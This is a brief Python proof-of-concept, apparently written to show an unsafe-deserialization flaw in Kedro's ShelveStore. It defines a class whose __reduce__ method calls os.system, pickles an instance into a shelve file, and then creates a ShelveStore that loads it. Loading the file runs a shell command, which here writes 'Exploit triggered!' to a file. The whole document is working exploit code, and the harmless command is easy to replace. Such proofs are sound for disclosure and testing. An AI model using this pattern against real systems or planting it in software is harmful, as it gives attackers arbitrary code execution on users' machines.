import os
import shelve
from kedro.framework.session.shelvestore import ShelveStore


# Define the malicious payload class
class MaliciousPayload:
    def __reduce__(self):
        # Write "Exploit triggered!" to a text file
        return (
            os.system,
            ("echo 'Exploit triggered!' > ./attack.txt",),
        )

# Define the folder and full path where the shelve file will be stored
base_folder = "./test/shelve_data"
session_id = "1234"
shelve_store_path = f"{base_folder}/{session_id}/store"

# Ensure the folder structure exists
os.makedirs(os.path.dirname(shelve_store_path), exist_ok=True)

# Save the malicious payload to the shelve
with shelve.open(shelve_store_path, writeback=True) as db:
    db["malicious"] = MaliciousPayload()

# Initialize ShelveStore with the path and session ID
ShelveStore(path=base_folder, session_id=session_id)